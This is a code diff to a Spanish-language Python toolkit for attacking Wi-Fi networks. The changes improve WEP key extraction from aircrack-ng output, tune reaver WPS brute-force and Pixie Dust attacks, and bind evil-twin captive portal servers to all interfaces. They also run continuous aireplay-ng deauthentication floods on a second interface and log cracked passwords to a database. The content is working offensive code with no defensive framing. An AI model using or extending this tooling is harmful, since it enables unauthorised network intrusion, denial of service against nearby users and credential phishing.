@@ -801,9 +801,14 @@ def modo_wizard():
             sp_wc.start()
             _wep_res = run(f"aircrack-ng {_wep_cap_file} 2>/dev/null", capture=True) or ""
             sp_wc.stop()
-            _wep_m = re.search(r'KEY FOUND.*?\[(.*?)\]', _wep_res, re.IGNORECASE)
-            if _wep_m:
-                clave  = _wep_m.group(1)
+            _wep_key = None
+            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
+                _wm = re.search(_pat, _wep_res, re.IGNORECASE)
+                if _wm:
+                    _wep_key = _wm.group(1).strip()
+                    break
+            clave = _wep_key or "encontrada (ver salida)"
+            if _wep_key:
                 metodo = "WEP ARP-replay + aircrack"
                 ok(f"WEP CRACKEADA: {GREEN}{clave}{END}")
             else:
@@ -1686,7 +1691,7 @@ def wps_attack():
             pause_back()
             return
         warn("Este ataque puede tardar HORAS. Muchos routers bloquean tras varios intentos.")
-        run(f"reaver -i {interfaz} -b {bssid} -c {channel} -vv")
+        run(f"reaver -i {interfaz} -b {bssid} -c {channel} -vv -N -d 0 -t 10 --no-associate")
     elif modo == "4":
         if not check_tool("bully"):
             error("bully no instalado: sudo apt install bully")
@@ -1937,16 +1942,26 @@ text-align:center;box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:360px;width:90%
 
     # HTTP servidor portal
     try:
-        httpd = HTTPServer(("192.168.1.1", 80), _H)
+        httpd = HTTPServer(("0.0.0.0", 80), _H)
     except OSError:
         run("fuser -k 80/tcp 2>/dev/null", capture=True)
         time.sleep(1)
-        httpd = HTTPServer(("192.168.1.1", 80), _H)
+        httpd = HTTPServer(("0.0.0.0", 80), _H)
     _thr.Thread(target=httpd.serve_forever, daemon=True).start()
 
     # Deauth continuo en background
+    # Preferir interfaz secundaria para deauth (evita conflicto con airbase-ng en la misma iface)
+    _ifaces_raw = run("iw dev 2>/dev/null | grep Interface | awk '{print $2}'", capture=True) or ""
+    _deauth_iface = iface
+    for _di in _ifaces_raw.strip().splitlines():
+        _di = _di.strip()
+        if _di and _di != iface and _di != "at0":
+            _di_mode = run(f"iw dev {_di} info 2>/dev/null | grep type", capture=True) or ""
+            if "monitor" in _di_mode:
+                _deauth_iface = _di
+                break
     deauth_proc = subprocess.Popen(
-        f"aireplay-ng -0 0 -a {bssid} {iface} 2>/dev/null",
+        f"aireplay-ng -0 0 -a {bssid} -D {_deauth_iface} 2>/dev/null",
         shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
 
@@ -2289,7 +2304,7 @@ h2{color:#2e7d32;margin-bottom:8px}p{color:#666;font-size:14px}</style>
 <script>setTimeout(()=>location.href='http://google.com',3500)</script>
 </div></body></html>""".encode("utf-8"))
 
-    httpd = HTTPServer(("192.168.1.1", 80), _Handler)
+    httpd = HTTPServer(("0.0.0.0", 80), _Handler)
     srv_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
 
     # ── Preparar interfaz ─────────────────────────────────────────────────────
@@ -3398,8 +3413,13 @@ def wep_full_attack():
     sp.stop()
 
     if "key found" in result.lower():
-        match = re.search(r'KEY FOUND.*?\[(.*?)\]', result, re.IGNORECASE)
-        clave = match.group(1) if match else "encontrada"
+        _wep_key = None
+        for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
+            _wm = re.search(_pat, result, re.IGNORECASE)
+            if _wm:
+                _wep_key = _wm.group(1).strip()
+                break
+        clave = _wep_key or "encontrada (ver salida)"
         ok(f"CLAVE WEP: {GREEN}{clave}{END}")
         aid = db_log_attack("WEP Attack", essid, bssid, channel, "crackeada", cap_file)
         db_log_password(aid, essid, bssid, clave, "aircrack-ng WEP")
@@ -4143,9 +4163,14 @@ def auto_pwner():
             cap_p.terminate(); time.sleep(2)
             cap_file = out_base + "-01.cap"
             res = run(f"aircrack-ng {cap_file} 2>/dev/null", capture=True) or ""
-            m = re.search(r'KEY FOUND.*?\[(.*?)\]', res, re.IGNORECASE)
-            if m:
-                clave = m.group(1)
+            _wep_key = None
+            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
+                _wm = re.search(_pat, res, re.IGNORECASE)
+                if _wm:
+                    _wep_key = _wm.group(1).strip()
+                    break
+            clave = _wep_key or "encontrada (ver salida)"
+            if _wep_key:
                 ok(f"WEP CRACKEADA: {GREEN}{clave}{END}")
                 resultado = f"crackeada:{clave}"
                 aid = db_log_attack("Auto-Pwner WEP", essid, bssid, channel, resultado, cap_file)
@@ -5767,10 +5792,13 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
             eng.update_phase(pct_step * 15)
             time.sleep(0.1)
         pixie_out = run(
-            f"timeout 55 reaver -i {iface} -b {bssid} -c {channel} "
+            f"timeout 90 reaver -i {iface} -b {bssid} -c {channel} "
             f"-K 1 -N -vv 2>&1", capture=True
         ) or ""
-        psk_m = re.search(r'WPA PSK[:\s]+["\']?([^\s"\']{6,})', pixie_out, re.I)
+        psk_m = None
+        for _psk_pat in [r'WPA PSK[:\s]+["\']?([^\s"\']{6,})', r'WPA2 Password[:\s]+(.+)', r'Passphrase[:\s]+["\'](.+?)["\']']:
+            psk_m = re.search(_psk_pat, pixie_out, re.I)
+            if psk_m: break
         if psk_m:
             clave  = psk_m.group(1)
             metodo = "WPS Pixie Dust (CVE)"
@@ -5952,9 +5980,15 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                 f"aircrack-ng {cap_file} -w {wordlist} 2>/dev/null",
                 capture=True
             ) or ""
-            km = re.search(r'KEY FOUND.*?\[(.+?)\]', ac_out, re.I)
+            _wep_key = None
+            for _pat in [r'KEY FOUND.*?\[\s*(.+?)\s*\]', r'KEY FOUND[:\s]+([0-9A-Fa-f:]{5,})', r'(\b(?:[0-9A-Fa-f]{2}:){4}[0-9A-Fa-f]{2}\b)']:
+                _wm = re.search(_pat, ac_out, re.I)
+                if _wm:
+                    _wep_key = _wm.group(1).strip()
+                    break
+            km = _wep_key
             if km:
-                clave = km.group(1); metodo = "Handshake + aircrack-ng"
+                clave = km; metodo = "Handshake + aircrack-ng"
                 eng.done(clave, metodo); return clave, metodo
         eng.update_phase(100)
 
